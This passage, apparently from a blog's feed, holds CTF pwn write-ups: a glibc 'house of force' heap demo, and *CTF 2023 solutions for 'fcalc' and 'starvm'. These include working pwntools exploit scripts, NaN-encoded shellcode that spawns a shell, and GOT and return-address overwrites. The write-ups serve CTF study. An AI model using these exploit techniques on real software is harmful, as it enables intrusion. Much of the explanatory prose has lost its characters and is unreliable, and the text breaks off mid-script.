MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_SZ                (sizeof(INTERNAL_SIZE_T))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                 \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (req) &gt;=                              \</span></span><br><span class="line"><span class="meta">   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                             \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>REQUEST_OUT_OF_RANGEmalloc-2 * MINSIZE</p><p>request2size((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)&gt;&#x3D;req,req+SIZE_SZbit0req0x8</p><h2 id="Wiki"><a href="#Wiki" class="headerlink" title="Wiki"></a>Wiki</h2><h3 id="topchunk"><a href="#topchunk" class="headerlink" title="topchunk"></a>topchunk</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== top chunksize0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">-4120</span>);  <span class="comment">// &lt;=== top chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602020</span></span><br><span class="line">Size: <span class="number">0x20fe1</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">/mnt/hgfs/share/how2heap/glibc_2<span class="number">.23</span>/a.out:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE </span><br><span class="line"><span class="number">0000000000600f</span>f8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line"><span class="number">0000000000601018</span> R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line"><span class="number">0000000000601020</span> R_X86_64_JUMP_SLOT  <span class="built_in">malloc</span>@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br></pre></td></tr></table></figure><p>-4120sizemallocsize&#x3D;target-0x20-victim&#x3D;0x00000000601020-0x20-0x602020&#x3D;FFFFFFFFFFFFEFE0&#x3D;-4128</p><p>req0x88FFFFFFFFFFFFEFE8&#x3D;-4120</p><p> malloc(-4120);got</p><p><img src="/2023/08/02/house-of-force/image-20230803143306102.png" alt="image-20230803143306102"></p><p>got</p><p><img src="/2023/08/02/house-of-force/image-20230803143531195.png" alt="image-20230803143531195"></p><h3 id="topchunk"><a href="#topchunk" class="headerlink" title="topchunk"></a>topchunk</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;                 <span class="comment">//&lt;=== top chunk size</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">140737345551056</span>); <span class="comment">//&lt;=== top chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602020</span></span><br><span class="line">Size: <span class="number">0x20fe1</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &amp;__malloc_hook</span><br><span class="line">$<span class="number">1</span> = (<span class="type">void</span> *(**)(<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)) <span class="number">0x7ffff7dd1b10</span> &lt;__malloc_hook&gt;</span><br></pre></td></tr></table></figure><p>140737345551056mallocsize&#x3D;target-0x20-victim&#x3D;0x7ffff7dd1b10-0x20-0x602020</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 *ctf pwn</title>
      <link href="/2023/08/02/startctf/"/>
      <url>/2023/08/02/startctf/</url>
      
        <content type="html"><![CDATA[<p>tqlorz</p><p><a href="https://github.com/sixstars/starctf2023/tree/main">https://github.com/sixstars/starctf2023/tree/main</a></p><h2 id="fcalc"><a href="#fcalc" class="headerlink" title="fcalc"></a>fcalc</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubantu20 ~/s/m/s/fcalc&gt; checksec ./fcalc</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/match/startctf/fcalc/fcalc&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">v7 = read(<span class="number">0</span>, buf, <span class="number">0x180</span>uLL);</span><br></pre></td></tr></table></figure><p>00040E0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> _BYTE v6[<span class="number">12</span>]; <span class="comment">// [rsp+8h] [rbp-50h] BYREF </span></span><br><span class="line">s = v6;  </span><br><span class="line">qword_40E0 = s;</span><br></pre></td></tr></table></figure><p>40E0shellcodeshellcode</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v13 = <span class="built_in">fabs</span>(*v10);</span><br><span class="line"><span class="keyword">if</span> ( v13 != <span class="number">0.0</span> &amp;&amp; (v13 &lt; <span class="number">1.0</span> || v13 &gt; <span class="number">100.0</span>) )</span><br></pre></td></tr></table></figure><p><img src="/2023/08/02/startctf/image-20230802164253679.png" alt="image-20230802164253679"></p><p>exp1<strong>0</strong>Nan(not a number)</p><p>nan <strong>xincluding NaN and </strong></p><table><thead><tr><th>Comparison</th><th>NaN  <em>x</em></th><th>NaN  <em>x</em></th><th>NaN &gt; <em>x</em></th><th>NaN &lt; <em>x</em></th><th>NaN &#x3D; <em>x</em></th><th>NaN  <em>x</em></th></tr></thead><tbody><tr><td>Result</td><td>False</td><td>False</td><td>False</td><td>False</td><td>False</td><td>True</td></tr></tbody></table><p>0x7ff0xfff</p><p>shellcode</p><p><img src="/2023/08/02/startctf/image-20230802163426648.png" alt="image-20230802163426648"></p><p><img src="/2023/08/02/startctf/image-20230802155245832.png" alt="image-20230802155245832"></p><p><img src="/2023/08/02/startctf/image-20230802165152552.png" alt="image-20230802165152552"></p><p> </p><p><img src="/2023/08/02/startctf/image-20230802170108947.png" alt="image-20230802170108947"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x7ffe32ff2d38-(0x7ffe32ff2d80+2)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0xffffffffffffffb6</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x7ffe32ff2d38-(0x7ffe32ff2d80+5)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0xffffffffffffffb3</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./fcalc&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line">db(<span class="string">&#x27;b *$rebase(0x1867)&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0174E)&#x27;)</span></span><br><span class="line">NaNHeader = <span class="string">b&quot;\xFF\xfF&quot;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#first</span></span><br><span class="line"><span class="comment">#FFFFFFB3</span></span><br><span class="line">call=<span class="string">b&#x27;\xE8\xb3\xFF\xFF\xFF&#x27;</span>+<span class="string">b&#x27;6&#x27;</span>+NaNHeader</span><br><span class="line"><span class="comment">#second</span></span><br><span class="line">jmp=<span class="string">b&#x27;\xE9\xb3\xFF\xFF\xFF&#x27;</span>+<span class="string">b&#x27;6&#x27;</span>+NaNHeader</span><br><span class="line"><span class="comment">#third</span></span><br><span class="line"><span class="comment"># B6</span></span><br><span class="line"><span class="comment"># jmp=b&#x27;\xEb\xb6&#x27;+b&#x27;beef&#x27;+NaNHeader</span></span><br><span class="line">sa(<span class="string">&#x27;expression:&#x27;</span>,<span class="string">b&#x27;1 2 0 hh&#x27;</span>+shellcode.ljust(<span class="number">0x48</span>,<span class="string">b&#x27;\x00&#x27;</span>)+call)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>03FF(1023),121023+log<sub>2</sub>(100&#x2F;2)&#x3D;1,028.643 404h</p><p>REX40h4Fh,<strong>REX REX</strong></p><p>40,<strong><code>\x40</code>nop</strong></p><p>0x400x404payload6</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    mul rsi #rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 0x68732f</span></span><br><span class="line"><span class="string">    shl rdi,0x10</span></span><br><span class="line"><span class="string">    add di,0x6e69</span></span><br><span class="line"><span class="string">    shl rdi,0x10</span></span><br><span class="line"><span class="string">    add di,0x622f</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_sc</span>(<span class="params">ft</span>):</span><br><span class="line">    pd = flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0</span>:asm(ft)</span><br><span class="line">        &#125;,filler = <span class="string">&#x27;\x40&#x27;</span>,length=<span class="number">8</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> pd</span><br><span class="line">payload=set_sc(<span class="string">&#x27;xor rsi, rsi&#x27;</span>)+set_sc(<span class="string">&#x27;mul rsi&#x27;</span>)+set_sc(<span class="string">&#x27;mov edi, 0x68732f&#x27;</span>)+set_sc(<span class="string">&#x27;shl rdi,0x10&#x27;</span>)+set_sc(<span class="string">&#x27;add di,0x6e69&#x27;</span>)+set_sc(<span class="string">&#x27;shl rdi,0x10&#x27;</span>)+set_sc(<span class="string">&#x27;add di,0x622f&#x27;</span>)+set_sc(<span class="string">&#x27;push rdi&#x27;</span>)+set_sc(<span class="string">&#x27;mov rdi, rsp&#x27;</span>)+set_sc(<span class="string">&#x27;mov al, 59&#x27;</span>)+set_sc(<span class="string">&#x27;push rax&#x27;</span>)+set_sc(<span class="string">&#x27;syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;expression:&#x27;</span>,<span class="string">b&#x27;1 2 0 hh&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+payload)</span><br></pre></td></tr></table></figure><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>paylaodjmp 4</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; disasm(b<span class="string">&quot;\xEB\x02&quot;</span>)</span><br><span class="line"><span class="string">&#x27;   0:   eb 02                   jmp    0x4&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jmpn = <span class="string">b&quot;\xEB\x02&quot;</span></span><br><span class="line">NaNHeader = <span class="string">b&quot;\xFF\x7F&quot;</span></span><br><span class="line"><span class="comment"># 0:  31 c0                   xor    eax,eax</span></span><br><span class="line"><span class="comment"># 2:  31 db                   xor    ebx,ebx</span></span><br><span class="line"><span class="comment"># 4:  66 b8 3b 00             mov    ax,0x3b</span></span><br><span class="line"><span class="comment"># 8:  66 bb 68 00             mov    bx,0x68</span></span><br><span class="line"><span class="comment"># c:  48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line"><span class="comment"># 10: 66 bb 2f 73             mov    bx,0x732f</span></span><br><span class="line"><span class="comment"># 14: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line"><span class="comment"># 18: 66 bb 69 6e             mov    bx,0x6e69</span></span><br><span class="line"><span class="comment"># 1c: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line"><span class="comment"># 20: 66 bb 2f 62             mov    bx,0x622f</span></span><br><span class="line"><span class="comment"># 24: 53                      push   rbx</span></span><br><span class="line"><span class="comment"># 25: 48 89 e7                mov    rdi,rsp</span></span><br><span class="line"><span class="comment"># 28: 31 f6                   xor    esi,esi</span></span><br><span class="line"><span class="comment"># 2a: 31 d2                   xor    edx,edx</span></span><br><span class="line"><span class="comment"># 2c: 0f 05                   syscall</span></span><br><span class="line">payload += <span class="string">b&#x27;\x31\xc0\x31\xdb&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xb8\x3b\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x68\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x2f\x73&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x69\x6e&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x66\xbb\x2f\x62&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x53\x48\x89\xe7&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x31\xf6\x31\xd2&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">payload += <span class="string">b&#x27;\x0f\x05\x90\x90&#x27;</span> + jmpn + NaNHeader    <span class="comment"># \x90 is nop</span></span><br></pre></td></tr></table></figure><p>nop</p><h2 id="starvm"><a href="#starvm" class="headerlink" title="starvm"></a>starvm</h2><p>vm pwnc++,c++stl,vm pwn</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;instr*&gt; codestack;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; datastack;</span><br><span class="line">    <span class="built_in">vector</span>&lt;instr*&gt;::iterator ip;</span><br><span class="line">    <span class="type">int</span> reg[<span class="number">14</span>]; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>* mem;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> eflags;</span><br><span class="line"></span><br><span class="line">&#125; starvm;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> instr_code;<span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> instr_num;<span class="comment">//</span></span><br><span class="line">&#125;instr;</span><br></pre></td></tr></table></figure><p>codedata   pc</p><blockquote><p>vector</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">vector</span> struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_9) ; XREF:</span><br><span class="line"><span class="number">00000000</span>                                         </span><br><span class="line"><span class="number">00000000</span> _M_start dq ?</span><br><span class="line"><span class="number">00000008</span> _M_finish dq ?</span><br><span class="line"><span class="number">00000010</span> _M_end_of_storage dq ?</span><br><span class="line"><span class="number">00000018</span> <span class="built_in">vector</span> ends</span><br></pre></td></tr></table></figure></blockquote><p>data6 710mem</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> VM_LOAD:<span class="number">6</span></span><br><span class="line">            <span class="comment">// load reg, bias</span></span><br><span class="line">                op1 = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                meml = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                <span class="keyword">if</span>(op1&gt;<span class="number">14</span>)&#123;</span><br><span class="line">                    bad();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(vmp-&gt;mem == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                    vmp-&gt;mem = (<span class="type">unsigned</span> <span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// oob read</span></span><br><span class="line">                vmp-&gt;reg[op1] = vmp-&gt;mem[meml];</span><br><span class="line">                vmp-&gt;ip++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> VM_UNLOAD:<span class="number">7</span></span><br><span class="line">            <span class="comment">// unload reg, bias</span></span><br><span class="line">                op1 = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                meml = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                <span class="keyword">if</span>(op1&gt;<span class="number">14</span>)&#123;</span><br><span class="line">                    bad();</span><br><span class="line">                &#125;</span><br><span class="line">                vmp-&gt;mem[meml] = vmp-&gt;reg[op1];</span><br><span class="line">                vmp-&gt;ip++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> VM_MOVINT:</span><br><span class="line">                <span class="comment">// MOVINT reg, int</span></span><br><span class="line">                op1 = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                vmp-&gt;reg[op1] = vmp-&gt;datastack[data_cnt++];</span><br><span class="line">                vmp-&gt;ip++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>exmallocgotsetvbufsetvbufgotsystemsevbufstdinshmemmaloc</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> )</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b *0x401754&#x27;)</span></span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">6</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10 reg[op1]=op2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6  reg[op1]=mem[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3 reg[op1]=reg[op1] - reg[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 mem[op2]=reg[op1]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cost = [<span class="number">14</span>, <span class="number">0x404020</span>, <span class="comment"># 10  mem=0x404020 setvbufgot</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6        reg[0]=mem[0]</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x30910</span>, <span class="comment"># 10    reg[1]=0x30910</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="comment"># 3        reg[0]=mem[0]0x81670-0x30910 system</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7         setvbufgot=system</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x404070</span>, <span class="comment"># 10     mem=malloc</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x401270</span>, <span class="comment"># 10    reg[0]=0x401270</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7     mallocgot=0x401270</span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7     mallocgot=0</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x4040D0</span>, <span class="comment"># 10 mem=stdin</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x4040D8</span>, <span class="comment"># 10    reg[0]=0x4040D8</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x6873</span>, <span class="comment"># 10    reg[1]=0x6873 sh</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7     stdinlow=0x4040D8</span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7     stdinhigh=0</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="comment"># 7     0x4040D8=0x6873</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0</span>, <span class="comment"># 10    mem</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6        malloc</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>oggglibc2.35ogg</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span> )</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b *0x00401A38&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">7</span>]</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;at &#x27;</span>)</span><br><span class="line">stack_ret=<span class="built_in">int</span>(sh.recv(<span class="built_in">len</span>(<span class="string">&#x27;7fff3b21f080&#x27;</span>)),<span class="number">16</span>)-(<span class="number">0x7ffd188fa9d0</span>-<span class="number">0x7ffd188fa9e8</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">10 reg[op1]=op2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6  reg[op1]=mem[op2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7 mem[op2]=reg[op1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2 reg[op1]=reg[op1] + reg[op2]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ogg=<span class="number">0xebcf8</span>-<span class="number">0x29d90</span></span><br><span class="line">cost = [<span class="number">14</span>,stack_ret&amp;<span class="number">0xffffffff</span>,</span><br><span class="line">        <span class="number">15</span>,(stack_ret&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>,<span class="comment">#memmain</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,<span class="comment">#6 reg[0]=mem[0]</span></span><br><span class="line">        <span class="number">1</span>,ogg,<span class="comment">#10 reg[op1]=ogg</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">1</span>,<span class="comment">#2 reg[0]=reg[1] + reg[0]</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span 